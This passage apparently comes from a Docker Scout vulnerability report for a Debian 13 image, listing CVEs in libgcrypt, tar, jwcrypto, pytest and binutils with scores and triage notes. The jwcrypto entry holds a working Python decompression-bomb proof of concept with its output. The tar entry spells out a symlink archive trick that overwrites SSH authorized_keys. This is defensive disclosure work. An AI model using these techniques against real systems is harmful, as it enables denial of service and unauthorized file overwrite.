https://dev.gnupg.org/T8211
Fixed by: https://git.gnupg.org/cgi-bin/gitweb.cgi?p=libgcrypt.git;a=commit;h=2d3d732c9bf87cc10729f69678dd9e6862f99fa3 (libgcrypt-1.12.2)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-2236?s=debian&n=libgcrypt20&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2024--2236" src="https://img.shields.io/badge/CVE--2024--2236-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.666%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>71st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A timing-based side-channel flaw was found in libgcrypt's RSA implementation. This issue may allow a remote attacker to initiate a Bleichenbacher-style attack, which can lead to the decryption of RSA ciphertexts.

---
- libgcrypt20 <unfixed> (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1065683)
https://bugzilla.redhat.com/show_bug.cgi?id=2268268
https://lists.gnupg.org/pipermail/gcrypt-devel/2024-March/005607.html
https://github.com/tomato42/marvin-toolkit/tree/master/example/libgcrypt
https://people.redhat.com/~hkario/marvin/
https://dev.gnupg.org/T7136
https://gitlab.com/redhat-crypto/libgcrypt/libgcrypt-mirror/-/merge_requests/17
Not in scope for libgcrypt security policy, work ongoing to add support in the protocol layer

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2018-6829?s=debian&n=libgcrypt20&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2018--6829" src="https://img.shields.io/badge/CVE--2018--6829-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.515%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>67th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

cipher/elgamal.c in Libgcrypt through 1.8.2, when used to encrypt messages directly, improperly encodes plaintexts, which allows attackers to obtain sensitive information by reading ciphertext data (i.e., it does not have semantic security in face of a ciphertext-only attack). The Decisional Diffie-Hellman (DDH) assumption does not hold for Libgcrypt's ElGamal implementation.

---
- libgcrypt20 <unfixed> (unimportant)
- libgcrypt11 <removed> (unimportant)
- gnupg1 <unfixed> (unimportant)
- gnupg <removed> (unimportant)
https://github.com/weikengchen/attack-on-libgcrypt-elgamal
https://github.com/weikengchen/attack-on-libgcrypt-elgamal/wiki
https://lists.gnupg.org/pipermail/gcrypt-devel/2018-February/004394.html
GnuPG uses ElGamal in hybrid mode only.
This is not a vulnerability in libgcrypt, but in an application using
it in an insecure manner, see also
https://lists.gnupg.org/pipermail/gcrypt-devel/2018-February/004401.html

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>tar</strong> <code>1.35+dfsg-3.1</code> (deb)</summary>

<small><code>pkg:deb/debian/tar@1.35%2Bdfsg-3.1?os_distro=trixie&os_name=debian&os_version=13</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-45582?s=debian&n=tar&ns=debian&t=deb&osn=debian&osv=13&vr=%3E%3D1.35%2Bdfsg-3.1"><img alt="medium : CVE--2025--45582" src="https://img.shields.io/badge/CVE--2025--45582-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=1.35+dfsg-3.1</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.130%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>32nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

GNU Tar through 1.35 allows file overwrite via directory traversal in crafted TAR archives, with a certain two-step process. First, the victim must extract an archive that contains a ../ symlink to a critical directory. Second, the victim must extract an archive that contains a critical file, specified via a relative pathname that begins with the symlink name and ends with that critical file's name. Here, the extraction follows the symlink and overwrites the critical file. This bypasses the protection mechanism of "Member name contains '..'" that would occur for a single TAR archive that attempted to specify the critical file via a ../ approach. For example, the first archive can contain "x -> ../../../../../home/victim/.ssh" and the second archive can contain x/authorized_keys. This can affect server applications that automatically extract any number of user-supplied TAR archives, and were relying on the blocking of traversal. This can also affect software installation processes in which "tar xf" is run more than once (e.g., when installing a package can automatically install two dependencies that are set up as untrusted tarballs instead of official packages).

---
Disputed tar issue, works as documented per upstream:
https://lists.gnu.org/archive/html/bug-tar/2025-08/msg00012.html
https://github.com/i900008/vulndb/blob/main/Gnu_tar_vuln.md

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2005-2541?s=debian&n=tar&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2005--2541" src="https://img.shields.io/badge/CVE--2005--2541-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>3.763%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>88th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Tar 1.15.1 does not properly warn the user when extracting setuid or setgid files, which may allow local users or remote attackers to gain privileges.

---
This is intended behaviour, after all tar is an archiving tool and you
need to give -p as a command line flag
- tar <unfixed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=328228; unimportant)

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>jwcrypto</strong> <code>1.5.6</code> (pypi)</summary>

<small><code>pkg:pypi/jwcrypto@1.5.6</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-39373?s=github&n=jwcrypto&t=pypi&vr=%3C%3D1.5.6"><img alt="medium 5.3: CVE--2026--39373" src="https://img.shields.io/badge/CVE--2026--39373-lightgrey?label=medium%205.3&labelColor=fbb552"/></a> <i>Improper Handling of Highly Compressed Data (Data Amplification)</i>

<table>
<tr><td>Affected range</td><td><code><=1.5.6</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>5.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.077%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>23rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary
The fix for GHSA-j857-7rvv-vj97 in v1.5.6 is weak in that it does not allow to fully control the amount of plaintext the receiver is willing to deal with and provides just a weak upper bound. The patch limits input token size to 250KB but does not validate the decompressed output size. An unauthenticated attacker can craft a JWE token under the 250KB input limit that decompresses to very large data that may exceed small devices memory availability, causing Denial of Service via memory exhaustion.

Although this is technically not unbounded I do recognize that it may be too much for devices and is something that could be surprising to developers, and we can do better than that.

NOTE: the original report was sloppy (probably AI slop) and claimed arbitrary memory consumption, but simple testing showed that while 100MB could be decompressed a 1GB output was denied because the token exceeded the 250K compressed serialization.

NOTE WELL: The proposed solution was also sloppy, proposing to first decompress the data completely in memory (therefore causing the memory exhaustion) and then checking how much memory was already used to deny the operation. I _intentionally_ left the "details" section untouched to show how bad AI slop is and how _uncritical_ the submitter was, even as it was obvious the "suggested fix" is actually no solution at all, as it was using the very call that he claimed was causing "arbitrary" memory exhaustion and wrapping it around an "if" ... the actual solution is in the resolving commit in version 1.5.7

### Details
The vulnerable code in `jwcrypto/jwe.py`:
```python
if len(data) > default_max_compressed_size:
    raise InvalidJWEData('Compressed data exceeds maximum allowed size')
self.plaintext = zlib.decompress(data, -zlib.MAX_WBITS)
```

The check validates `data` which is the **compressed** bytes, not the decompressed output. A 132KB token (under the 250KB limit) can decompress to approximately 100MB with no error raised.

### PoC
Tested on jwcrypto 1.5.6 (patched version):
```python
import zlib
from jwcrypto import jwe
from jwcrypto.jwk import JWK
import time

key = JWK.generate(kty='oct', size=128)
bomb_data = b"A" * 1024 * 1024 * 100  # 100MB uncompressed

token = jwe.JWE(
    plaintext=bomb_data,
    protected={"alg": "A128KW", "enc": "A128GCM", "zip": "DEF"}
)
token.add_recipient(key)
serialized = token.serialize(compact=True)
print(f"Token size: {len(serialized)/1024:.1f} KB")  # 132.8 KB — under 250KB limit

tok2 = jwe.JWE()
tok2.deserialize(serialized, key)
print(f"Decompressed: {len(tok2.plaintext)/1024/1024:.0f} MB")  # 100 MB
```

Output:
```
Token size: 132.8 KB
Decompressed: 100 MB
```

### Impact
An unauthenticated attacker can exhaust server memory by sending crafted JWE tokens with ZIP compression. The existing patch (v1.5.6) does not prevent this attack. An unauthenticated attacker can cause memory exhaustion on memory-constrained systems. A token under the 250KB input limit can decompress to approximately 100MB.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>pytest</strong> <code>7.4.0</code> (pypi)</summary>

<small><code>pkg:pypi/pytest@7.4.0</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-71176?s=github&n=pytest&t=pypi&vr=%3C9.0.3"><img alt="medium 6.8: CVE--2025--71176" src="https://img.shields.io/badge/CVE--2025--71176-lightgrey?label=medium%206.8&labelColor=fbb552"/></a> <i>Creation of Temporary File in Directory with Insecure Permissions</i>

<table>
<tr><td>Affected range</td><td><code><9.0.3</code></td></tr>
<tr><td>Fixed version</td><td><code>9.0.3</code></td></tr>
<tr><td>CVSS Score</td><td><code>6.8</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.006%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>0th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

pytest through 9.0.2 on UNIX relies on directories with the `/tmp/pytest-of-{user}` name pattern, which allows local users to cause a denial of service or possibly gain privileges.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 54" src="https://img.shields.io/badge/L-54-fce1a9"/> <!-- unspecified: 0 --><strong>binutils</strong> <code>2.44-3</code> (deb)</summary>

<small><code>pkg:deb/debian/binutils@2.44-3?os_distro=trixie&os_name=debian&os_version=13</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-6846?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2026--6846" src="https://img.shields.io/badge/CVE--2026--6846-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.020%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>6th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in binutils. A heap-buffer-overflow vulnerability exists when processing a specially crafted XCOFF (Extended Common Object File Format) object file during linking. A local attacker could trick a user into processing this malicious file, which could lead to arbitrary code execution, allowing the attacker to run unauthorized commands, or cause a denial of service, making the system unavailable.

---
- binutils <unfixed> (unimportant)
https://bugzilla.redhat.com/show_bug.cgi?id=2460006
https://sourceware.org/bugzilla/show_bug.cgi?id=34049
https://sourceware.org/git/gitweb.cgi?p=binutils-gdb.git;h=7a089e0302382f4d4e077941156e1eaa68d01393
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-6845?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2026--6845" src="https://img.shields.io/badge/CVE--2026--6845-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.005%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>0th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in binutils, specifically within the `readelf` utility. This vulnerability allows a local attacker to cause a Denial of Service (DoS) by tricking a user into processing a specially crafted Executable and Linkable Format (ELF) file. The exploitation of this flaw can lead to the system becoming unresponsive due to excessive resource consumption or a program crash.

---
- binutils <unfixed> (unimportant)
https://bugzilla.redhat.com/show_bug.cgi?id=2460012
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-6844?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2026--6844" src="https://img.shields.io/badge/CVE--2026--6844-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.019%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>5th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in the `readelf` utility of the binutils package. A local attacker could exploit two Denial of Service (DoS) vulnerabilities by providing a specially crafted Executable and Linkable Format (ELF) file. One vulnerability, a resource exhaustion (CWE-400), can lead to an out-of-memory condition. The other, a null pointer dereference (CWE-476), can cause a segmentation fault. Both issues can result in the `readelf` utility becoming unresponsive or crashing, leading to a denial of service.

---
- binutils <unfixed> (unimportant)
https://bugzilla.redhat.com/show_bug.cgi?id=2460016
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-4647?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2026--4647" src="https://img.shields.io/badge/CVE--2026--4647-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.004%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>0th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in the GNU Binutils BFD library, a widely used component for handling binary files such as object files and executables. The issue occurs when processing specially crafted XCOFF object files, where a relocation type value is not properly validated before being used. This can cause the program to read memory outside of intended bounds. As a result, affected tools may crash or expose unintended memory contents, leading to denial-of-service or limited information disclosure risks.

---
- binutils <unfixed> (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=33919
Fixed by: https://sourceware.org/git/gitweb.cgi?p=binutils-gdb.git;h=9e99dbc1f19ffaf18d0250788951706066ebe7f2
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-3442?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2026--3442" src="https://img.shields.io/badge/CVE--2026--3442-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.006%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>0th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in GNU Binutils. This vulnerability, a heap-based buffer overflow, specifically an out-of-bounds read, exists in the bfd linker component. An attacker could exploit this by convincing a user to process a specially crafted malicious XCOFF object file. Successful exploitation may lead to the disclosure of sensitive information or cause the application to crash, resulting in an application level denial of service.

---
- binutils <unfixed> (unimportant)
https://bugzilla.redhat.com/show_bug.cgi?id=2443828
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-3441?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2026--3441" src="https://img.shields.io/badge/CVE--2026--3441-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.006%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>0th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in GNU Binutils. This heap-based buffer overflow vulnerability, specifically an out-of-bounds read in the bfd linker, allows an attacker to gain access to sensitive information. By convincing a user to process a specially crafted XCOFF object file, an attacker can trigger this flaw, potentially leading to information disclosure or an application level denial of service.

---
- binutils <unfixed> (unimportant)
https://bugzilla.redhat.com/show_bug.cgi?id=2443826
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-8225?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2025--8225" src="https://img.shields.io/badge/CVE--2025--8225-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.033%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>10th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability was found in GNU Binutils 2.44 and classified as problematic. This issue affects the function process_debug_info of the file binutils/dwarf.c of the component DWARF Section Handler. The manipulation leads to memory leak. Attacking locally is a requirement. The identifier of the patch is e51fdff7d2e538c0e5accdd65649ac68e6e0ddd4. It is recommended to apply a patch to fix this issue.

---
- binutils 2.45-3 (unimportant)
https://sourceware.org/git/gitweb.cgi?p=binutils-gdb.git;h=e51fdff7d2e538c0e5accdd65649ac68e6e0ddd4
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-7546?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2025--7546" src="https://img.shields.io/badge/CVE--2025--7546-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.064%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>20th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability, which was classified as problematic, has been found in GNU Binutils 2.45. Affected by this issue is the function bfd_elf_set_group_contents of the file bfd/elf.c. The manipulation leads to out-of-bounds write. It is possible to launch the attack on the local host. The exploit has been disclosed to the public and may be used. The name of the patch is 41461010eb7c79fee7a9d5f6209accdaac66cc6b. It is recommended to apply a patch to fix this issue.

---
- binutils 2.45-3 (unimportant)
https://sourceware.org/git/gitweb.cgi?p=binutils-gdb.git;h=41461010eb7c79fee7a9d5f6209accdaac66cc6b
https://sourceware.org/bugzilla/show_bug.cgi?id=33050
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-7545?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2025--7545" src="https://img.shields.io/badge/CVE--2025--7545-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.069%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>21st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability classified as problematic was found in GNU Binutils 2.45. Affected by this vulnerability is the function copy_section of the file binutils/objcopy.c. The manipulation leads to heap-based buffer overflow. Attacking locally is a requirement. The exploit has been disclosed to the public and may be used. The patch is named 08c3cbe5926e4d355b5cb70bbec2b1eeb40c2944. It is recommended to apply a patch to fix this issue.

---
- binutils 2.45-3 (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=33049
https://sourceware.org/git/gitweb.cgi?p=binutils-gdb.git;h=08c3cbe5926e4d355b5cb70bbec2b1eeb40c2944
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-69652?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2025--69652" src="https://img.shields.io/badge/CVE--2025--69652-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.022%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>6th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

GNU Binutils thru 2.46 readelf contains a vulnerability that leads to an abort (SIGABRT) when processing a crafted ELF binary with malformed DWARF abbrev or debug information. Due to incomplete state cleanup in process_debug_info(), an invalid debug_info_p state may propagate into DWARF attribute parsing routines. When certain malformed attributes result in an unexpected data length of zero, byte_get_little_endian() triggers a fatal abort. No evidence of memory corruption or code execution was observed; the impact is limited to denial of service.

---
- binutils <unfixed> (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=33701
https://sourceware.org/git/gitweb.cgi?p=binutils-gdb.git;h=44b79abd0fa12e7947252eb4c6e5d16ed6033e01
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-69651?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2025--69651" src="https://img.shields.io/badge/CVE--2025--69651-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.007%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>1st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

GNU Binutils thru 2.46 readelf contains a vulnerability that leads to an invalid pointer free when processing a crafted ELF binary with malformed relocation or symbol data. If dump_relocations returns early due to parsing errors, the internal all_relocations array may remain partially uninitialized. Later, process_got_section_contents() may attempt to free an invalid r_symbol pointer, triggering memory corruption checks in glibc and causing the program to terminate with SIGABRT. No evidence of further memory corruption or code execution was observed; the impact is limited to denial of service. NOTE: this is disputed by third parties because the observed behavior occurred only in pre-release code and did not affect any tagged version.

---
- binutils <unfixed> (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=33700
https://sourceware.org/git/gitweb.cgi?p=binutils-gdb.git;h=ea4bc025abdba85a90e26e13f551c16a44bfa921
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-69650?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2025--69650" src="https://img.shields.io/badge/CVE--2025--69650-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.149%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>35th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

GNU Binutils thru 2.46 readelf contains a double free vulnerability when processing a crafted ELF binary with malformed relocation data. During GOT relocation handling, dump_relocations may return early without initializing the all_relocations array. As a result, process_got_section_contents() may pass an uninitialized r_symbol pointer to free(), leading to a double free and terminating the program with SIGABRT. No evidence of exploitable memory corruption or code execution was observed; the impact is limited to denial of service. NOTE: this is disputed by third parties because the observed behavior occurred only in pre-release code and did not affect any tagged version.

---
- binutils <unfixed> (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=33698
https://sourceware.org/git/gitweb.cgi?p=binutils-gdb.git;h=ea4bc025abdba85a90e26e13f551c16a44bfa921
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-69649?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2025--69649" src="https://img.shields.io/badge/CVE--2025--69649-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.045%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>14th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

GNU Binutils thru 2.46 readelf contains a null pointer dereference vulnerability when processing a crafted ELF binary with malformed header fields. During relocation processing, an invalid or null section pointer may be passed into display_relocations(), resulting in a segmentation fault (SIGSEGV) and abrupt termination. No evidence of memory corruption beyond the null pointer dereference, nor any possibility of code execution, was observed.

---
- binutils <unfixed> (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=33697
https://sourceware.org/git/gitweb.cgi?p=binutils-gdb.git;h=66a3492ce68e1ae45b2489bd9a815c39ea5d7f66
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-69648?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2025--69648" src="https://img.shields.io/badge/CVE--2025--69648-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.022%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>6th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

GNU Binutils thru 2.45.1 readelf contains a denial-of-service vulnerability when processing a crafted binary with malformed DWARF .debug_rnglists data. A logic flaw in the DWARF parsing path causes readelf to repeatedly print the same warning message without making forward progress, resulting in a non-terminating output loop that requires manual interruption. No evidence of memory corruption or code execution was observed.

---
- binutils <unfixed> (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=33641
https://sourceware.org/git/gitweb.cgi?p=binutils-gdb.git;h=598704a00cbac5e85c2bedd363357b5bf6fcee33
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-69647?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2025--69647" src="https://img.shields.io/badge/CVE--2025--69647-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.024%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>7th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

GNU Binutils thru 2.45.1 readelf contains a denial-of-service vulnerability when processing a crafted binary with malformed DWARF loclists data. A logic flaw in the DWARF parsing code can cause readelf to repeatedly print the same table output without making forward progress, resulting in an unbounded output loop that never terminates unless externally interrupted. A local attacker can trigger this behavior by supplying a malicious input file, causing excessive CPU and I/O usage and preventing readelf from completing its analysis.

---
- binutils <unfixed> (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=33640
https://sourceware.org/git/gitweb.cgi?p=binutils-gdb.git;h=455446bbdc8675f34808187de2bbad4682016ff7
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-69646?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2025--69646" src="https://img.shields.io/badge/CVE--2025--69646-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.005%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>0th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Binutils objdump contains a denial-of-service vulnerability when processing a crafted binary with malformed DWARF debug_rnglists data. A logic error in the handling of the debug_rnglists header can cause objdump to repeatedly print the same warning message and fail to terminate, resulting in an unbounded logging loop until the process is interrupted. The issue was observed in binutils 2.44. A local attacker can exploit this vulnerability by supplying a malicious input file, leading to excessive CPU and I/O usage and preventing completion of the objdump analysis.

---
- binutils <unfixed> (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=33638
